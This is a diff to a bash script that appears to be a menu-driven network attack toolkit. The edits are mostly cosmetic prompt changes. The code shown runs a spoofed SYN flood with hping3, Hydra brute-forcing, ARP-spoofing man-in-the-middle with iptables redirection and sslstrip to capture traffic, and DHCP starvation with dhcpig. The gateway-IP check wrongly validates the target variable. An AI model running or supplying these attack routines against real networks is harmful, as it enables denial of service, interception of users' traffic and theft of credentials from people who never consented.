@@ -17,11 +17,13 @@ help() {
 cleanup() {
 	echo
 	echo
-	 echo -e "\e[34m[+]\e[0m  Stopping attacks..."
+	 echo -e "\e[31m[+]\e[0m  Stopping attacks..."
 	sudo echo "0" > /proc/sys/net/ipv4/ip_forward 2>/dev/null
 	sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port 2>/dev/null
 	pkill -f "python3 -m http.server" 2>/dev/null
-	sleep 2
+	sleep 1
+	echo
+	read -p $'\e[34m[+]\e[0m Press enter to return to main menu'
 	clear
 	menu
 }
@@ -148,7 +150,7 @@ pod() {
 				 echo -e "\e[34m[+]\e[0m  Flooding $target_ip with $packets packets..." 
 				sleep 1 
 				echo
-				echo "Press Ctrl-C to stop attack"
+				echo -e "\e[34m[+]\e[0m Press Ctrl-C to stop attack"
 				sleep 2
 				echo
 				hping3 -c $packets -d $size -S -p $port --flood --rand-source $target_ip -V
@@ -158,7 +160,7 @@ pod() {
 				 echo -e "\e[34m[+]\e[0m  Flooding $target_ip with $packets packets..." 
 				sleep 1 
 				echo
-				echo "Press Ctrl-C to stop attack"
+				echo -e "\e[34m[+]\e[0m Press Ctrl-C to stop attack"
 				sleep 2
 				hping3 -c $packets -d $size -S -p $port --flood $target_ip -V
 				;;
@@ -224,7 +226,7 @@ bruteforce() {
 		echo -e "\e[34m[+]\e[0m  Launching Hydra $protocol brute force attack on $target_ip..."
 		sleep 1
 		echo
-		echo "Press Ctrl-C to stop attack"
+		echo -e "\e[34m[+]\e[0m Press Ctrl-C to stop attack"
 		sleep 2
 		echo
 
@@ -237,7 +239,7 @@ bruteforce() {
 			echo
 			echo -e "\e[31m[!]\e[0m Hydra failed"
 			echo
-			read -p "Press enter to return to main menu"
+			read -p $'\e[34m[+]\e[0m Press enter to return to main menu'
 			sudo rm -f credentials.txt
 			break  # Return to the menu
 		fi
@@ -248,69 +250,69 @@ bruteforce() {
 
 
 mitmarp() {
-	cleanup_mitm(){
+    cleanup_mitm(){
         echo
-         echo -e "\e[34m[+]\e[0m  Stopping attack..."
-        sudo echo "0" > /proc/sys/net/ipv4/ip_forward
-        sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
-        exit 0
-    	}
-    	
-    	trap cleanup_mitm SIGINT
-    
-	while true; do
-		while true; do
-			echo
-			read -p "Target IP: " target_ip
-			# regex to match ipv4 address
-			ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
-			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
-			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
-			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+        echo -e "\e[34m[+]\e[0m  Stopping attacks..."
+        sudo echo "0" > /proc/sys/net/ipv4/ip_forward  2>/dev/null
+        sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port  2>/dev/null
+        sleep 1
+        menu
+    }
 
-			if [[ $target_ip =~ $ipv4_regex ]]; then
-				break
-			else
-				echo
-				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
-			fi
-		done
-		
-		while true; do
-			read -p "Default gateway IP: " dfg_ip
-			# regex to match ipv4 address
-			ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
-			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
-			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
-			ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+    trap cleanup_mitm SIGINT
 
-			if [[ $target_ip =~ $ipv4_regex ]]; then
-				break
-			else
-				echo
-				 echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
-			fi
-		done
-		
-		read -p "SSLSrip listening port (default 1337): " port
-		port=${port:-1337} # set default if enter is pressed
-		
-		# launch attack
-		echo
-		 echo -e "\e[34m[+]\e[0m  Launching attack on target $target_ip and default gateway $dfg_ip ..."
-		sudo echo "1" > /proc/sys/net/ipv4/ip_forward
-		sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
-		sleep 1
-		echo 
-		echo "Press Ctrl-C to stop attack"
-		sleep 2
-		xterm -title "arpspoof target to target" -geometry 80x24+0+0 -e sudo arpspoof -i $iface -t $target_ip $dfg_ip
-		xterm -title "arpspoof target to dfg" -geometry 80x24-0+0 -e sudo arpspoof -i $iface -t $dfg_ip $target_ip
-		sleep 1
-		xterm -title "sslstrip and sniff" -geometry 100x40+50%+50% -e sudo sslstrip -l $port -a -f
-	done
-	
-	menu
+    while true; do
+        while true; do
+            echo
+            read -p "Target IP: " target_ip
+            # regex to match ipv4 address
+            ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+
+            if [[ $target_ip =~ $ipv4_regex ]]; then
+                break
+            else
+                echo
+                echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
+            fi
+        done
+        
+        while true; do
+            read -p "Default gateway IP: " dfg_ip
+            # regex to match ipv4 address
+            ipv4_regex='^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.'
+            ipv4_regex+='(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$'
+
+            if [[ $target_ip =~ $ipv4_regex ]]; then
+                break
+            else
+                echo
+                echo -e "\e[31m[!]\e[0m Invalid IPv4 address format."
+            fi
+        done
+        
+        read -p "SSLSrip listening port (default 1337): " port
+        port=${port:-1337} # set default if enter is pressed
+        
+        # launch attack
+        echo
+        echo -e "\e[34m[+]\e[0m  Launching attack on target $target_ip and default gateway $dfg_ip ..."
+        sudo echo "1" > /proc/sys/net/ipv4/ip_forward
+        sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port
+        sleep 1
+        echo 
+        echo -e "\e[34m[+]\e[0m Press Ctrl-C to stop attack"
+        sleep 2
+        xterm -title "arpspoof target to target" -geometry 80x24+0+0 -e sudo arpspoof -i $iface -t $target_ip $dfg_ip &
+        xterm -title "arpspoof target to dfg" -geometry 80x24-0+0 -e sudo arpspoof -i $iface -t $dfg_ip $target_ip &
+        sleep 2
+        xterm -title "sslstrip and sniff" -geometry 100x40+50%+50% -e sudo sslstrip -l $port -a -f &
+    done
+    menu
 }
 
 dhcpstarve() { 
@@ -326,7 +328,7 @@ dhcpstarve() {
 				 echo -e "\e[34m[+]\e[0m  Launching attack..."
 				sleep 1
 				echo
-				echo "Press Ctrl-C to stop attack"
+				echo -e "\e[34m[+]\e[0m Press Ctrl-C to stop attack"
 				sleep 2
 				echo
 				dhcpig -c -v3 -l -a -i -o $iface && break 
@@ -336,7 +338,7 @@ dhcpstarve() {
 				 echo -e "\e[34m[+]\e[0m  Launching attack..."
 				sleep 1
 				echo
-				echo "Press Ctrl-C to stop attack"
+				echo -e "\e[34m[+]\e[0m Press Ctrl-C to stop attack"
 				sleep 2
 				echo
 				dhcpig -6 -c -v3 -l -i -o $iface && break
